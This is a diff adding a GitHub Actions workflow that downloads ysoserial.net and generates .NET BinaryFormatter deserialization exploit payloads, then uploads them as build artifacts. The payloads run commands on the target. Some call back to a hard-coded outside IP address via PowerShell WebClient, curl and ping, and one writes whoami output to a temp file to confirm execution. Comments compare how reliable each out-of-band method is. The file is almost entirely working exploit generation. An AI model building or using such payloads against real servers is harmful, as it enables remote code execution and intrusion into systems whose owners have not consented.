@@ -1,0 +1,39 @@
+name: Generate PowerShell payloads
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Download ysoserial.net
+        run: |
+          $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
+          Invoke-WebRequest $url -OutFile ysoserial.zip
+          Expand-Archive ysoserial.zip -DestinationPath yso
+      - name: Generate
+        run: |
+          $exe = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1
+          $ip = "167.172.142.69"
+          $port = "8080"
+
+          # PowerShell WebClient - most reliable OOB on Windows
+          $cmd1 = "powershell -c `"(New-Object Net.WebClient).DownloadString('http://${ip}:${port}/pwned')`""
+          & $exe.FullName -g DataSet -f BinaryFormatter -c $cmd1 -o base64 | Out-File ps_dataset.b64 -Encoding ascii
+
+          # cmd with full path
+          $cmd2 = "C:\Windows\System32\cmd.exe /c curl http://${ip}:${port}/pwned"
+          & $exe.FullName -g DataSet -f BinaryFormatter -c $cmd2 -o base64 | Out-File fullpath_dataset.b64 -Encoding ascii
+
+          # ping OOB - simpler than curl
+          $cmd3 = "powershell -c `"ping -n 1 ${ip}`""
+          & $exe.FullName -g DataSet -f BinaryFormatter -c $cmd3 -o base64 | Out-File ping_dataset.b64 -Encoding ascii
+
+          # whoami to temp file - confirm execution
+          $cmd4 = "cmd /c whoami > C:\Windows\Temp\pwn.txt"
+          & $exe.FullName -g DataSet -f BinaryFormatter -c $cmd4 -o base64 | Out-File whoami_dataset.b64 -Encoding ascii
+
+          dir *.b64 | Select Name,Length
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: ps-payloads
+          path: "*.b64"
